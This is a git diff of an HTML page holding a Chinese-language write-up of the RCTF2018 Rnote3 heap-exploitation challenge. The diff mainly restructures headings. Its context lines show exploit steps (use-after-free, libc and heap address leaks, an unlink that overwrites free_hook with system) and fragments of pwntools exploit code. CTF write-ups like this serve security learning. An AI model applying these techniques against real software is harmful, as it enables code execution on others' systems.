@@ -302,6 +302,7 @@ img {
 保护机制如下：<br />
 <img src="https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/Rnote3/picture/2.PNG" alt="保护机制" />  </p>
 <h2>2.漏洞利用</h2>
+<h3>利用方法1: UAF+Unlink</h3>
 <p>创建堆块如下所示：</p>
 <pre><code>payload = 'AAAAAA'
 ru('Exit\n')
@@ -312,7 +313,7 @@ add_note('c',0x88,payload)
 add_note('f',0x88,payload)
 </code></pre>
 
-<h3>2.1 泄露libc地址</h3>
+<h4>Step 1: 泄露libc地址</h4>
 <p>首先通过show_note()函数对之后想要释放的堆块进行定位，然后调用delete_note()函数，传入一个当前不存在的title值，此时程序遍历当前note列表，无法找到对应title的note，因此就不会对ptr指针进行更新，默认释放了之前show_note()函数对该栈地址设定的值。并且对note_list进行清空时，i=32，note_list[32]=0。 </p>
 <pre><code>step 1: leak libc
 show_note('c')
@@ -327,7 +328,7 @@ lg('libc_addr',libc.address)
 </code></pre>
 
 <p>一个需要注意的点是，保存note结构的chunk是一个fastbin，当对该fastbin进行free后，如果该fastbin是对应fastbin链表中第一个被释放的，fd位置会被清0，而fd的位置正好保存了title值。因此查找时不应该查找原title值，应该查找'\x00'。</p>
-<h3>2.2 泄露堆地址</h3>
+<h4>Step 2: 泄露堆地址</h4>
 <p>方法与lead libc相同，不同的在于，需要释放一个conten也为fastbin大小（0x30）的note。然后申请一个content大小为smallbin大小的note，将刚才释放的note结构（0x20）申请回来。再次释放一个content大小为fastbin大小（0x30）的note，此时0x30大小的fastbin空闲链表中就有2个chunk，其中第一个chunk的fd字段就为一个heap地址，并且0x20大小的fastbin空闲链表中只有一个chunk（note结构），其fd字段为0。</p>
 <pre><code>step 2: leak heap_addr
 add_note('c',0x88,payload)
@@ -345,10 +346,12 @@ heap_addr = u64(rv(6).ljust(8,'\x00')) - 0x20
 lg('heap_addr',heap_addr)
 </code></pre>
 
-<h3>2.3 触发unlink，修改free_hook为system</h3>
+<h4>Step 3: 触发unlink，修改free_hook为system</h4>
 <p>通过堆布局，使两个smallbin（content）在堆空间布局上连续。然后释放相邻的两个smallbin，并再次申请一个content大小为0x90（大于0x88即可）的note结构。覆写下一个chunk的presize和size字段，然后释放下一个chunk，出发unlink。<br />
 之后覆写free_hook为system，成功实现利用。  </p>
-<h3>3.expolit代码</h3>
+<h3>利用方法2:UAF+Fastbin Attack</h3>
+<p>未完待续。。。。。</p>
+<h2>3.expolit代码</h2>
 <pre><code>from pwn import *
 from ctypes import *
 import os
